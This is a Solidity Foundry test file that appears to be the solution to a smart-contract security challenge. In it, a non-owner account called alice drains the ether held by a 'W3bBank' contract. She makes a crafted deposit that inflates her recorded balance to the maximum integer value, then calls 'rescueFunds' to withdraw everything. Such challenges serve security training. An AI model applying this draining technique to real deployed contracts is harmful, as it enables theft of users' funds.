//

// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.18;

// You are to write a test for this contract, you will create two adrdresses, one will be owner and the other will be alice,
// the owner should deploy the contract with 1 ether, and you have to find a way to drain the ether from the contract without
// pranking the owner and alice should have the balance >= 1 ether. Note you are only permitted to prank alice

import {Test, console2} from "forge-std/Test.sol";
import {W3bBank} from "../src/bank.sol";

contract BankTest is Test {
    W3bBank public bank;
    address owner = makeAddr("owner");
    address alice = makeAddr("alice");

    function setUp() public {
        vm.deal(owner, 1 ether);
        vm.deal(alice, 1 ether);
        vm.prank(owner);
        bank = new W3bBank{value: 1 ether}();
    }

    function testDrain() public {
        vm.startPrank(alice);

        bank.deposit{value: 1}(alice, 16859);
        assertEq(bank.viewDeposit(alice), type(uint256).max);

        bank.rescueFunds();

        assertEq(address(bank).balance, 0);
        assertEq(address(alice).balance, 2 ether);
    }
}
